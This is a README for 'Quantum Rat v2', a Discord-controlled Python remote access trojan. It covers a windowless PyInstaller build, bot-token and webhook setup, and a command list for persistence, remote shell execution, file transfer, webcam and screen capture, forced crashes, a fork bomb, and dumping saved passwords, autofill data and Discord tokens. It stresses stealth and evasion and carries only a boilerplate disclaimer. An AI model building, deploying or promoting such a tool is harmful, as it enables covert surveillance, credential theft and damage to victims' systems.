# Quantum Rat v2

Quantum Rat v2 is an advanced remote administration tool designed for sophisticated control and deep system interaction. Built with cutting-edge techniques, it aims to provide unparalleled stealth, flexibility, and power to its operators. This version introduces enhanced capabilities, improved evasion mechanisms, and a more robust architecture compared to its predecessor.

**Disclaimer:** This tool is intended for educational, security research, and authorized penetration testing purposes only. Unauthorized use is strictly prohibited and may have severe legal consequences. The creators are not responsible for any misuse or damage caused by this software.

## Table of Contents

*   [Features](#features)
*   [Architecture](#architecture)
*   [Installation](#installation)
*   [Configuration](#configuration)
*   [Usage](#usage)
*   [Evasion Techniques](#evasion-techniques)
*   [Contributing](#contributing)
*   [License](#license)



1.  **Clone the Repository or download as zip:**
    ```bash
    git clone <repository_url>
    cd quantum-rat-v2
    ```

2.  **Install Dependencies:**
    A general installation of core dependencies can be done via:
    ```bash
    pip install -r requirements.txt
    ```


3.  **Build/Compile**
   PyInstaller
    ```bash
    pip install pyinstaller
    pyinstaller --onefile --noconsole bot.py
    ```
    

## Configuration

The primary configuration involves setting up the communication channel and sensitive parameters.

Change the bot token and guild id in bot.py and change the webhook in main.py 

## Usage

Once deployed and running, the Quantum Rat v2 agent connects to the specified Discord server. Operators can then issue commands through the bot's commands prefixed by `!`.

** Commands:**

# R4T V2 Commands:

# System Access:
# !startup: Add to autostart.
# !execute <commands>: Run shell command.
# !cd <directory>: Change directory.
# !process: List running processes.
# !processkill <pid>: Kill a process by PID.
# !shutdown: Shut down the system.
# !restart: Restart the system.
# !download <filename>: Download file.
# !upload: Upload file.
# !listdir: List all files in the current directory.

# System Information:
# !ip: Get public IP info.
# !sysinfo: Get system info.

# Troll Access:
# !open <link>: Open a web browser.
# !bsod: Trigger blue screen.
# !msgbox <title> <text>: Show message box.
# !textspeech <text>: Text to speech.
# !wallpaper <attachment>: Set wallpaper.
# !forkbomb: Rabbit Virus.
# !xfreecrash: Open xfree until browser crashes.
# !volume <command|0-100>: Volume controls.
# !garynarkle: Opens gary narkle article.

# Device Access:
# !screenshot: Take a screenshot.
# !webcam: Capture webcam image.

# Credential Dump:
# !password: Dumps saved passwords.
# !grabtokens: Grab Discord tokens.
# !autofill: Dumps saved autofill data.


*(Refer to the `!help` command output within the running bot for a comprehensive list.)*


## Contributing

Contributions to Quantum Rat v2 are welcome from security researchers and developers interested, Please adhere to the following guidelines:

1.  Fork the repository.
2.  Create a new branch for your feature or bug fix.
3.  Make your changes and ensure they align with the project's goals (stealth, advanced functionality).
4.  Test your changes thoroughly.
5.  Submit a Pull Request.

## License

This project is licensed under the [MIT License](LICENSE) - see the `LICENSE` file for details.
